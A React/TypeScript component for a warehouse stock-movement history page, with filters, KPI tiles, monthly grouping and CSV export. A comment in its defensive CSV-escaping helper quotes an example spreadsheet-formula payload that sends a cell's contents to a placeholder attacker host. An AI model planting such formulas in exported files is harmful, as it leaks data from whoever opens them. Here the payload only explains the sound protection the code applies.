import { useEffect, useMemo, useState } from "react";
import {
  useCatalog,
  useOperationMovements,
  useOperationWarehouse,
  type MovementRow,
  type MovementsFilters,
} from "@/lib/queries";
import type { ProductCategory, ProductSkuDto } from "@carres/shared";

/**
 * OperationMovements — HQ stock-in/out history with KPIs + period chips +
 * by-month grouping + 5-filter row + CSV export.
 *
 * Mirrors `reference/proto/operation-screens.jsx` `OperationMovements`
 * (lines 109-407):
 *   - Header: "← Warehouse / Movement log" breadcrumb + h1 "Stock in & out
 *     history" + summary line "Showing N movements · {periodLabel} · {sku}".
 *   - 4 KPI tiles: Movements (count) / Stock in (sum qty kind=in) / Stock out
 *     (sum qty kind=out) / Net change (in - out).
 *   - Period chips: 7d / 30d (default) / 90d / All / Custom (from + to date
 *     inputs that appear under the period bar when active).
 *   - View toggle (right side of period bar): Flat list / By month.
 *   - Filter row (5 selects): Warehouse / Category / SKU / Kind / Search
 *     (ref + note free text).
 *   - Body: list view (table) OR by-month view (collapsible per-month sections
 *     each with their own totals + table).
 *   - CSV export button (top-right): downloads `stock-movements-YYYY-MM-DD.csv`
 *     via Blob + createObjectURL. Escapes commas/quotes/newlines.
 *   - Clear filters button (top-right, btn-ghost): resets all 5 filters +
 *     period back to defaults.
 *
 * Server vs client split:
 *   - All 5 filters + period are sent to GET /api/operation/movements (M4.3)
 *     and applied server-side. The hook re-fetches on filter change.
 *   - The 4 KPIs + by-month grouping are computed client-side from the
 *     returned rows array (capped at 200 server-side per spec §18.6 P1=A).
 *   - CSV export uses the same in-memory rows, so it tops out at 200 rows.
 *
 * Prefill (M5.4 → M5.5 hand-off):
 *   - OperationWarehouse passes `{ sku, warehouseId }` when the user clicks
 *     the "Movement log →" button or a SKU row. We accept the `initialFilters`
 *     prop and seed our filter state once on mount; OperationApp routes the
 *     prefill through.
 */

interface Props {
  /** Optional one-shot prefill from OperationWarehouse (sku and/or warehouseId). */
  initialFilters?: Partial<MovementsFilters>;
  /** Optional shell-tab switcher — wired so the breadcrumb "← Warehouse" goes back. */
  setTab?: (t: string) => void;
  /** Optional callback when user dismisses the prefill (so parent can clear it). */
  clearInitialFilters?: () => void;
}

const PERIOD_CHIPS: { key: NonNullable<MovementsFilters["period"]>; label: string }[] = [
  { key: "7d", label: "Last 7 days" },
  { key: "30d", label: "Last 30 days" },
  { key: "90d", label: "Last 90 days" },
  { key: "all", label: "All time" },
  { key: "custom", label: "Custom…" },
];

const CATEGORY_OPTIONS: { key: "all" | ProductCategory; label: string; icon: string }[] = [
  { key: "all", label: "All categories", icon: "" },
  { key: "mattress", label: "Mattress", icon: "▭" },
  { key: "bedframe", label: "Bed frame", icon: "▤" },
  { key: "sofa", label: "Sofa", icon: "▦" },
];

/** Convert a YYYY-MM-DD date input value into an ISO datetime string.
 *  `from` → 00:00:00 boundary, `to` → 23:59:59.999 boundary. The M4 server
 *  uses half-open `.gte(from).lt(to)` so the inclusive `to` boundary matches
 *  the user's calendar-day mental model. */
function toIsoFrom(d: string): string | undefined {
  if (!d) return undefined;
  return new Date(`${d}T00:00:00`).toISOString();
}
function toIsoTo(d: string): string | undefined {
  if (!d) return undefined;
  return new Date(`${d}T23:59:59.999`).toISOString();
}

/** CSV-safe escape: defang Excel/Sheets formula evaluation, then RFC4180-quote.
 *  Cells starting with `=`, `+`, `-`, `@`, `\t`, or `\r` are treated as formulas
 *  by Excel/Google Sheets — a operation user could write a movement note like
 *  `=HYPERLINK("http://attacker/?leak="&A1,"OK")` and another user opening the
 *  CSV in Excel would trigger formula execution. Prefix with single-quote `'`
 *  to force text mode. See: https://owasp.org/www-community/attacks/CSV_Injection
 *  Then wrap every field in quotes + double inner quotes for RFC4180. */
function csvEscape(value: unknown): string {
  const raw = value == null ? "" : String(value);
  const FORMULA_LEAD = /^[=+\-@\t\r]/;
  const safe = FORMULA_LEAD.test(raw) ? `'${raw}` : raw;
  return `"${safe.replace(/"/g, '""')}"`;
}

export default function OperationMovements({ initialFilters, setTab, clearInitialFilters }: Props) {
  // Filters — server roundtrips on every change. Period chip + custom dates
  // are kept in local state separately so toggling chip ↔ custom doesn't
  // discard the user's typed range.
  const [warehouseId, setWarehouseId] = useState<string | undefined>(
    initialFilters?.warehouseId,
  );
  const [category, setCategory] = useState<NonNullable<MovementsFilters["category"]>>(
    initialFilters?.category ?? "all",
  );
  const [sku, setSku] = useState<string | undefined>(initialFilters?.sku);
  const [kind, setKind] = useState<NonNullable<MovementsFilters["kind"]>>(
    initialFilters?.kind ?? "all",
  );
  const [search, setSearch] = useState<string>(initialFilters?.search ?? "");
  const [period, setPeriod] = useState<NonNullable<MovementsFilters["period"]>>(
    initialFilters?.period ?? "30d",
  );
  const [fromDate, setFromDate] = useState<string>(""); // YYYY-MM-DD
  const [toDate, setToDate] = useState<string>(""); // YYYY-MM-DD
  const [view, setView] = useState<"list" | "month">("list");

  // Consume the prefill once: tell the parent to drop it so a refresh / re-mount
  // doesn't replay it. Mirrors proto's `clearPrefill` pattern (line 122).
  useEffect(() => {
    if (initialFilters && clearInitialFilters) clearInitialFilters();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Build the filter object passed to useOperationMovements. Skip from/to when
  // period !== 'custom' (server validates: custom requires both).
  const filters = useMemo<MovementsFilters>(() => {
    const f: MovementsFilters = {};
    if (warehouseId) f.warehouseId = warehouseId;
    if (category !== "all") f.category = category;
    if (sku) f.sku = sku;
    if (kind !== "all") f.kind = kind;
    if (search.trim()) f.search = search.trim();
    f.period = period;
    if (period === "custom") {
      const fromIso = toIsoFrom(fromDate);
      const toIso = toIsoTo(toDate);
      if (fromIso) f.from = fromIso;
      if (toIso) f.to = toIso;
    }
    return f;
  }, [warehouseId, category, sku, kind, search, period, fromDate, toDate]);

  // Custom period needs both from + to; otherwise we suppress the network call
  // (the server returns 422 anyway). Letting the query run in an invalid state
  // would just eat the 30s staleTime.
  const customMissingDates =
    period === "custom" && (!fromDate || !toDate);

  const movementsQ = useOperationMovements(filters, {
    enabled: !customMissingDates,
  });
  const warehouseQ = useOperationWarehouse();
  const catalogQ = useCatalog();

  const warehouses = warehouseQ.data?.warehouses ?? [];
  const skus = catalogQ.data?.skus ?? [];
  const skuByCode = useMemo(() => {
    const m = new Map<string, ProductSkuDto>();
    for (const s of skus) m.set(s.sku, s);
    return m;
  }, [skus]);
  const warehouseNameById = useMemo(() => {
    const m = new Map<string, string>();
    for (const w of warehouses) m.set(w.id, w.name);
    return m;
  }, [warehouses]);

  // SKU options for the dropdown, filtered by current category if any.
  const skuOptions = useMemo(() => {
    if (category === "all") return skus;
    return skus.filter((s) => s.sku.startsWith(`${category}:`));
  }, [skus, category]);

  const rows: MovementRow[] = movementsQ.data?.rows ?? [];
  const limit = movementsQ.data?.limit ?? 200;

  // --- Client-side derived: 4 KPIs ---
  const inUnits = useMemo(
    () => rows.filter((r) => r.kind === "in").reduce((s, r) => s + r.qty, 0),
    [rows],
  );
  const outUnits = useMemo(
    () => rows.filter((r) => r.kind === "out").reduce((s, r) => s + r.qty, 0),
    [rows],
  );
  const netUnits = inUnits - outUnits;

  // --- Client-side derived: by-month groups ---
  const byMonth = useMemo(() => {
    const groups = new Map<
      string,
      { key: string; label: string; items: MovementRow[]; inUnits: number; outUnits: number }
    >();
    for (const r of rows) {
      const d = new Date(r.occurred_at);
      const key = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}`;
      const label = d.toLocaleDateString("en-MY", {
        month: "long",
        year: "numeric",
      });
      let g = groups.get(key);
      if (!g) {
        g = { key, label, items: [], inUnits: 0, outUnits: 0 };
        groups.set(key, g);
      }
      g.items.push(r);
      if (r.kind === "in") g.inUnits += r.qty;
      else if (r.kind === "out") g.outUnits += r.qty;
    }
    return [...groups.values()].sort((a, b) => b.key.localeCompare(a.key));
  }, [rows]);

  // --- Period summary text for the header subline ---
  const periodLabel =
    period === "all"
      ? "all time"
      : period === "7d"
        ? "last 7 days"
        : period === "30d"
          ? "last 30 days"
          : period === "90d"
            ? "last 90 days"
            : `${fromDate || "—"} to ${toDate || "—"}`;
  const skuLabel = sku ? (skuByCode.get(sku)?.variant ?? sku) : "all SKUs";

  function clearAll() {
    setWarehouseId(undefined);
    setCategory("all");
    setSku(undefined);
    setKind("all");
    setSearch("");
    setPeriod("30d");
    setFromDate("");
    setToDate("");
  }

  function exportCSV() {
    const header = ["When", "Kind", "SKU", "Warehouse", "Qty", "Ref", "Note", "By"];
    const dataRows = rows.map((r) => {
      const skuName = skuByCode.get(r.sku)?.variant ?? r.sku;
      const whName = warehouseNameById.get(r.warehouse_id) ?? r.warehouse_id;
      const qtyStr =
        (r.kind === "in" ? "+" : r.kind === "out" ? "-" : "Δ") + String(r.qty);
      return [
        r.occurred_at,
        r.kind,
        skuName,
        whName,
        qtyStr,
        r.ref ?? "",
        r.note ?? "",
        r.by_role ?? "",
      ];
    });
    const csv = [header, ...dataRows]
      .map((row) => row.map(csvEscape).join(","))
      .join("\n");
    const blob = new Blob([csv], { type: "text/csv;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `stock-movements-${new Date().toISOString().slice(0, 10)}.csv`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  if (movementsQ.isLoading) {
    return (
      <div className="px-9 py-7 pb-14">
        <MovementsSkeleton />
      </div>
    );
  }
  if (movementsQ.isError) {
    return (
      <div className="px-9 py-7 pb-14">
        <div className="rounded-md bg-destructive/10 border border-destructive/30 p-4 text-sm">
          <div className="text-destructive font-semibold mb-2">
            Couldn&rsquo;t load movements
          </div>
          <div className="text-[12px] text-base-700 mb-3">
            {(movementsQ.error as Error | undefined)?.message ?? "Unknown error"}
          </div>
          <button
            type="button"
            onClick={() => void movementsQ.refetch()}
            className="btn-secondary text-[11px] py-1.5 px-3"
          >
            Retry
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="px-9 py-7 pb-14" data-testid="operation-movements-page">
      {/* Header */}
      <div className="flex justify-between items-start mb-[22px] gap-4">
        <div>
          <div className="kicker flex items-center">
            <button
              type="button"
              onClick={() => setTab?.("warehouse")}
              className="text-base-500 hover:text-base-700 transition-colors"
              style={{ all: "unset", cursor: "pointer", color: "var(--base-500)" }}
              data-testid="movements-back-warehouse"
            >
              ← Warehouse
            </button>
            <span className="mx-1.5 text-base-300">/</span>
            <span>Movement log</span>
          </div>
          <h1 className="t-h1 font-display mt-1.5 text-base-900">
            Stock in &amp; out history
          </h1>
          <div
            className="font-body text-[13px] text-base-600 mt-1"
            data-testid="movements-summary"
          >
            Showing <strong>{rows.length}</strong> movement
            {rows.length === 1 ? "" : "s"} · {periodLabel} · {skuLabel}
            {warehouseId ? (
              <> · {warehouseNameById.get(warehouseId) ?? warehouseId}</>
            ) : null}
          </div>
        </div>
        <div className="flex gap-2">
          <button
            type="button"
            onClick={exportCSV}
            disabled={rows.length === 0}
            className="btn-secondary text-[12px] py-2 px-3.5"
            data-testid="movements-export-csv"
          >
            ↓ Export CSV
          </button>
          <button
            type="button"
            onClick={clearAll}
            className="btn-ghost text-[12px] py-2 px-3.5"
            data-testid="movements-clear-filters"
          >
            Clear filters
          </button>
        </div>
      </div>

      {/* 4 KPI tiles */}
      <div
        className="grid gap-3 mb-[22px]"
        style={{ gridTemplateColumns: "repeat(4, minmax(0, 1fr))" }}
        data-testid="movements-kpis"
      >
        <div
          className="bg-white border border-base-200 rounded-md px-[18px] py-3.5"
          data-testid="movements-kpi-count"
        >
          <div className="label">Movements</div>
          <div className="font-mono text-[28px] font-semibold mt-0.5 leading-none text-base-900">
            {rows.length}
          </div>
          <div className="font-body text-[11px] text-base-500 mt-1.5">
            in this period
          </div>
        </div>
        <div
          className="bg-white rounded-md px-[18px] py-3.5"
          style={{ border: "1px solid rgba(50,120,80,.4)" }}
          data-testid="movements-kpi-in"
        >
          <div className="label" style={{ color: "var(--success)" }}>
            ↑ Stock in
          </div>
          <div
            className="font-mono text-[28px] font-semibold mt-0.5 leading-none"
            style={{ color: "var(--success)" }}
          >
            +{inUnits}
          </div>
          <div className="font-body text-[11px] text-base-500 mt-1.5">
            units received
          </div>
        </div>
        <div
          className="bg-white rounded-md px-[18px] py-3.5"
          style={{ border: "1px solid rgba(214,79,32,.4)" }}
          data-testid="movements-kpi-out"
        >
          <div className="label" style={{ color: "var(--terracotta)" }}>
            ↓ Stock out
          </div>
          <div
            className="font-mono text-[28px] font-semibold mt-0.5 leading-none"
            style={{ color: "var(--terracotta)" }}
          >
            −{outUnits}
          </div>
          <div className="font-body text-[11px] text-base-500 mt-1.5">
            units delivered
          </div>
        </div>
        <div
          className="bg-white border border-base-200 rounded-md px-[18px] py-3.5"
          data-testid="movements-kpi-net"
        >
          <div className="label">Net change</div>
          <div
            className="font-mono text-[28px] font-semibold mt-0.5 leading-none"
            style={{
              color: netUnits >= 0 ? "var(--success)" : "var(--danger)",
            }}
          >
            {netUnits >= 0 ? "+" : ""}
            {netUnits}
          </div>
          <div className="font-body text-[11px] text-base-500 mt-1.5">
            balance delta
          </div>
        </div>
      </div>

      {/* Period chips + view toggle */}
      <div
        className="bg-white border border-base-200 rounded-md px-[18px] py-3.5 mb-3.5"
        data-testid="movements-period-bar"
      >
        <div className="flex justify-between items-center flex-wrap gap-3.5">
          <div className="flex items-center gap-1.5 flex-wrap">
            <div className="label mr-1.5">Period</div>
            {PERIOD_CHIPS.map((p) => {
              const active = period === p.key;
              return (
                <button
                  key={p.key}
                  type="button"
                  onClick={() => setPeriod(p.key)}
                  data-testid={`movements-period-${p.key}`}
                  className="rounded-[4px] text-[12px] transition-colors"
                  style={{
                    all: "unset",
                    cursor: "pointer",
                    padding: "6px 12px",
                    border: `1px solid ${active ? "var(--base-900)" : "var(--base-200)"}`,
                    background: active ? "var(--base-900)" : "#fff",
                    color: active ? "#fff" : "var(--base-700)",
                    fontSize: 12,
                    fontWeight: active ? 600 : 500,
                  }}
                  aria-pressed={active}
                >
                  {p.label}
                </button>
              );
            })}
          </div>
          <div
            className="flex gap-1 border border-base-200 rounded-[4px] p-0.5"
            data-testid="movements-view-toggle"
          >
            {[
              { k: "list" as const, t: "Flat list" },
              { k: "month" as const, t: "By month" },
            ].map((v) => {
              const active = view === v.k;
              return (
                <button
                  key={v.k}
                  type="button"
                  onClick={() => setView(v.k)}
                  data-testid={`movements-view-${v.k}`}
                  style={{
                    all: "unset",
                    cursor: "pointer",
                    padding: "5px 12px",
                    background: active ? "var(--base-100)" : "transparent",
                    color: active ? "var(--base-900)" : "var(--base-600)",
                    borderRadius: 3,
                    fontSize: 11.5,
                    fontWeight: active ? 600 : 500,
                  }}
                  aria-pressed={active}
                >
                  {v.t}
                </button>
              );
            })}
          </div>
        </div>
        {period === "custom" && (
          <div
            className="flex gap-2.5 items-center mt-3 pt-3 border-t border-dashed border-base-200"
            data-testid="movements-custom-range"
          >
            <label className="label mr-1">From</label>
            <input
              type="date"
              value={fromDate}
              onChange={(e) => setFromDate(e.target.value)}
              aria-label="From date"
              className="border border-base-300 rounded-[4px] py-1.5 px-2.5 text-[12px] bg-white outline-none focus:border-base-500"
              style={{ width: 160 }}
              data-testid="movements-custom-from"
            />
            <label className="label mx-1">To</label>
            <input
              type="date"
              value={toDate}
              onChange={(e) => setToDate(e.target.value)}
              aria-label="To date"
              className="border border-base-300 rounded-[4px] py-1.5 px-2.5 text-[12px] bg-white outline-none focus:border-base-500"
              style={{ width: 160 }}
              data-testid="movements-custom-to"
            />
            {customMissingDates && (
              <span
                className="text-[11px] text-base-500 ml-2"
                data-testid="movements-custom-hint"
              >
                Pick both from and to dates.
              </span>
            )}
          </div>
        )}
      </div>

      {/* 5-filter row */}
      <div
        className="grid gap-2 mb-3.5"
        style={{
          gridTemplateColumns: "1.2fr 1.2fr 1.4fr 1fr 1.6fr",
        }}
        data-testid="movements-filters"
      >
        <select
          value={warehouseId ?? ""}
          onChange={(e) => setWarehouseId(e.target.value || undefined)}
          aria-label="Warehouse"
          className="border border-base-300 rounded-[4px] py-2 px-2.5 text-[12px] bg-white outline-none focus:border-base-500"
          data-testid="movements-filter-warehouse"
        >
          <option value="">All warehouses</option>
          {warehouses.map((w) => (
            <option key={w.id} value={w.id}>
              {w.name}
            </option>
          ))}
        </select>
        <select
          value={category}
          onChange={(e) => {
            setCategory(e.target.value as NonNullable<MovementsFilters["category"]>);
            setSku(undefined);
          }}
          aria-label="Category"
          className="border border-base-300 rounded-[4px] py-2 px-2.5 text-[12px] bg-white outline-none focus:border-base-500"
          data-testid="movements-filter-category"
        >
          {CATEGORY_OPTIONS.map((c) => (
            <option key={c.key} value={c.key}>
              {c.icon ? `${c.icon} ` : ""}
              {c.label}
            </option>
          ))}
        </select>
        <select
          value={sku ?? ""}
          onChange={(e) => setSku(e.target.value || undefined)}
          aria-label="SKU"
          className="border border-base-300 rounded-[4px] py-2 px-2.5 text-[12px] bg-white outline-none focus:border-base-500"
          data-testid="movements-filter-sku"
        >
          <option value="">All SKUs</option>
          {skuOptions.map((s) => (
            <option key={s.sku} value={s.sku}>
              {s.variant}
            </option>
          ))}
        </select>
        <select
          value={kind}
          onChange={(e) => setKind(e.target.value as NonNullable<MovementsFilters["kind"]>)}
          aria-label="Kind"
          className="border border-base-300 rounded-[4px] py-2 px-2.5 text-[12px] bg-white outline-none focus:border-base-500"
          data-testid="movements-filter-kind"
        >
          <option value="all">In + Out</option>
          <option value="in">In only</option>
          <option value="out">Out only</option>
        </select>
        <input
          type="search"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Search ref / note…"
          aria-label="Search ref or note"
          className="border border-base-300 rounded-[4px] py-2 px-2.5 text-[12px] bg-white outline-none focus:border-base-500"
          data-testid="movements-filter-search"
        />
      </div>

      {/* Body */}
      {customMissingDates ? (
        <div
          className="bg-white border border-base-200 rounded-md p-12 text-center text-base-500 text-[13px]"
          data-testid="movements-empty"
        >
          Pick a custom date range above to see movements.
        </div>
      ) : view === "list" ? (
        <div className="bg-white border border-base-200 rounded-md" data-testid="movements-list">
          <MovementTableHeader />
          {rows.length === 0 ? (
            <div
              className="p-12 text-center text-base-500 text-[13px]"
              data-testid="movements-empty"
            >
              No movements match these filters.
            </div>
          ) : (
            rows.map((r) => (
              <MovementTableRow
                key={r.id}
                row={r}
                skuLabel={skuByCode.get(r.sku)?.variant ?? r.sku}
                warehouseName={warehouseNameById.get(r.warehouse_id) ?? r.warehouse_id}
              />
            ))
          )}
        </div>
      ) : (
        <div className="flex flex-col gap-3.5" data-testid="movements-by-month">
          {byMonth.length === 0 ? (
            <div
              className="bg-white border border-base-200 rounded-md p-12 text-center text-base-500 text-[13px]"
              data-testid="movements-empty"
            >
              No movements match these filters.
            </div>
          ) : (
            byMonth.map((g) => (
              <div
                key={g.key}
                className="bg-white border border-base-200 rounded-md"
                data-testid={`movements-month-${g.key}`}
              >
                <div className="flex justify-between items-center px-5 py-3.5 border-b border-base-100 bg-base-50">
                  <div>
                    <div className="t-h3 font-display">
                      {g.label}
                    </div>
                    <div className="font-body text-[11px] text-base-500 mt-0.5">
                      {g.items.length} movement{g.items.length === 1 ? "" : "s"}
                    </div>
                  </div>
                  <div className="flex gap-[18px]">
                    <div className="text-right">
                      <div className="label" style={{ color: "var(--success)" }}>
                        ↑ in
                      </div>
                      <div
                        className="font-mono text-[18px] font-semibold"
                        style={{ color: "var(--success)" }}
                      >
                        +{g.inUnits}
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="label" style={{ color: "var(--terracotta)" }}>
                        ↓ out
                      </div>
                      <div
                        className="font-mono text-[18px] font-semibold"
                        style={{ color: "var(--terracotta)" }}
                      >
                        −{g.outUnits}
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="label">net</div>
                      <div
                        className="font-mono text-[18px] font-semibold"
                        style={{
                          color:
                            g.inUnits - g.outUnits >= 0
                              ? "var(--success)"
                              : "var(--terracotta)",
                        }}
                      >
                        {g.inUnits - g.outUnits >= 0 ? "+" : ""}
                        {g.inUnits - g.outUnits}
                      </div>
                    </div>
                  </div>
                </div>
                <MovementTableHeader />
                {g.items.map((r) => (
                  <MovementTableRow
                    key={r.id}
                    row={r}
                    skuLabel={skuByCode.get(r.sku)?.variant ?? r.sku}
                    warehouseName={
                      warehouseNameById.get(r.warehouse_id) ?? r.warehouse_id
                    }
                  />
                ))}
              </div>
            ))
          )}
        </div>
      )}

      {/* LIMIT 200 hint — proto §18.6 P1=A. Surface only when we hit the cap so
          users know there might be older rows hidden. */}
      {rows.length === limit && (
        <div
          className="text-[11px] text-base-500 mt-3 text-center"
          data-testid="movements-limit-hint"
        >
          Showing the most recent {limit} movements. Tighten filters to see
          older history.
        </div>
      )}
    </div>
  );
}

const ROW_GRID = "120px 70px 1.6fr 1fr 90px 1.6fr 100px";

function MovementTableHeader() {
  return (
    <div
      className="grid items-center px-[18px] py-2.5 bg-base-50 border-b border-base-200 gap-2.5"
      style={{ gridTemplateColumns: ROW_GRID }}
    >
      <div className="label">When</div>
      <div className="label">Kind</div>
      <div className="label">SKU</div>
      <div className="label">Warehouse</div>
      <div className="label text-right">Qty</div>
      <div className="label">Ref / note</div>
      <div className="label">By</div>
    </div>
  );
}

function MovementTableRow({
  row,
  skuLabel,
  warehouseName,
}: {
  row: MovementRow;
  skuLabel: string;
  warehouseName: string;
}) {
  const isIn = row.kind === "in";
  const isOut = row.kind === "out";
  const dt = new Date(row.occurred_at);
  const datePretty = dt.toLocaleDateString("en-MY", {
    day: "2-digit",
    month: "short",
  });
  const timePretty = dt.toLocaleTimeString("en-MY", {
    hour: "2-digit",
    minute: "2-digit",
    hour12: false,
  });
  const qtyColor = isIn
    ? "var(--success)"
    : isOut
      ? "var(--terracotta)"
      : "var(--base-700)";
  const qtyPrefix = isIn ? "+" : isOut ? "−" : "Δ";
  const kindLabel = isIn ? "↑ IN" : isOut ? "↓ OUT" : "ADJ";
  const kindBg = isIn
    ? "rgba(50,120,80,.12)"
    : isOut
      ? "rgba(214,79,32,.12)"
      : "var(--base-100)";
  const kindFg = isIn
    ? "var(--success)"
    : isOut
      ? "var(--terracotta)"
      : "var(--base-700)";
  return (
    <div
      data-testid={`movements-row-${row.id}`}
      className="grid items-center px-[18px] py-3 border-t border-base-100 gap-2.5 text-[12.5px]"
      style={{ gridTemplateColumns: ROW_GRID }}
    >
      <div className="font-body text-base-700 leading-snug">
        <div className="font-medium">{datePretty}</div>
        <div className="text-[10.5px] text-base-500">{timePretty}</div>
      </div>
      <div>
        <span
          className="font-ui font-bold uppercase rounded-[3px] inline-block"
          style={{
            fontSize: 9.5,
            letterSpacing: "0.08em",
            background: kindBg,
            color: kindFg,
            padding: "3px 8px",
          }}
          data-testid={`movements-row-kind-${row.id}`}
        >
          {kindLabel}
        </span>
      </div>
      <div className="font-body font-medium truncate">{skuLabel}</div>
      <div className="font-body text-base-600 truncate">{warehouseName}</div>
      <div
        className="font-mono font-semibold text-right"
        style={{ color: qtyColor }}
      >
        {qtyPrefix}
        {row.qty}
      </div>
      <div className="font-body text-base-700 leading-snug min-w-0">
        {row.ref ? <div className="font-medium truncate">{row.ref}</div> : null}
        {row.note ? (
          <div className="text-[10.5px] text-base-500 mt-0.5 truncate">
            {row.note}
          </div>
        ) : null}
        {!row.ref && !row.note ? (
          <div className="text-[10.5px] text-base-400">—</div>
        ) : null}
      </div>
      <div className="font-body text-[10.5px] text-base-500 capitalize truncate">
        {row.by_role ?? "—"}
      </div>
    </div>
  );
}

function MovementsSkeleton() {
  return (
    <div data-testid="movements-skeleton">
      <div className="h-12 w-1/3 bg-base-100 rounded animate-pulse mb-6" />
      <div
        className="grid gap-3 mb-6"
        style={{ gridTemplateColumns: "repeat(4, 1fr)" }}
      >
        {Array.from({ length: 4 }).map((_, i) => (
          <div key={i} className="h-20 bg-base-100 rounded-md animate-pulse" />
        ))}
      </div>
      <div className="h-14 bg-base-100 rounded animate-pulse mb-3.5" />
      <div className="grid gap-2 mb-3.5" style={{ gridTemplateColumns: "1.2fr 1.2fr 1.4fr 1fr 1.6fr" }}>
        {Array.from({ length: 5 }).map((_, i) => (
          <div key={i} className="h-9 bg-base-100 rounded animate-pulse" />
        ))}
      </div>
      <div className="bg-white border border-base-200 rounded-md">
        {Array.from({ length: 6 }).map((_, i) => (
          <div
            key={i}
            className="h-12 border-b border-base-100 px-4 flex items-center gap-3"
          >
            <div className="h-3 w-16 bg-base-50 rounded animate-pulse" />
            <div className="h-5 w-12 bg-base-50 rounded animate-pulse" />
            <div className="h-3 flex-1 bg-base-50 rounded animate-pulse" />
            <div className="h-3 w-16 bg-base-50 rounded animate-pulse" />
            <div className="h-3 w-12 bg-base-50 rounded animate-pulse" />
          </div>
        ))}
      </div>
    </div>
  );
}
